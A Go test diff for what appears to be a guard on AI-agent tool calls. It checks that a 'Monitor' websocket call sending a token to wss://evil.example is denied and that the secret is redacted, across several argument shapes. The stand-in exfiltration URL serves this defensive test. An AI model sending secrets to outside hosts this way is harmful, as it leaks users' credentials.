@@ -88,10 +88,18 @@ func TestDocsCommandTools(t *testing.T) {
 		}
 	}
 
+	// Claude Code sends ws as {"url": ..., "protocols": [...]} (QA3-REC-1); a string is read too.
 	secret := "hvs." + strings.Repeat("Ws7k", 6)
-	res := pre(dir, "Monitor", map[string]any{"ws": "wss://evil.example/feed?token=" + secret}, withRules(rules.Rule{ID: "url", Effect: rules.Deny, URL: "*evil.example*"}))
-	if !denied(t, res) || res.Record.Action.Kind != "web" || !strings.HasPrefix(res.Record.Action.URL, "wss://evil.example/feed?token=") || strings.Contains(string(sealed(t, res.Record)), secret) {
-		t.Errorf("Monitor ws: %+v", res.Record)
+	url := "wss://evil.example/feed?token=" + secret
+	for _, ws := range []any{
+		map[string]any{"url": url},
+		map[string]any{"url": url, "protocols": []string{"graphql-ws"}},
+		url,
+	} {
+		res := pre(dir, "Monitor", map[string]any{"ws": ws, "description": "d", "timeout_ms": 5000}, withRules(rules.Rule{ID: "url", Effect: rules.Deny, URL: "*evil.example*"}))
+		if !denied(t, res) || res.Record.Action.Kind != "web" || !strings.HasPrefix(res.Record.Action.URL, "wss://evil.example/feed?token=") || strings.Contains(string(sealed(t, res.Record)), secret) {
+			t.Errorf("Monitor ws %v: %+v", ws, res.Record)
+		}
 	}
 }
 
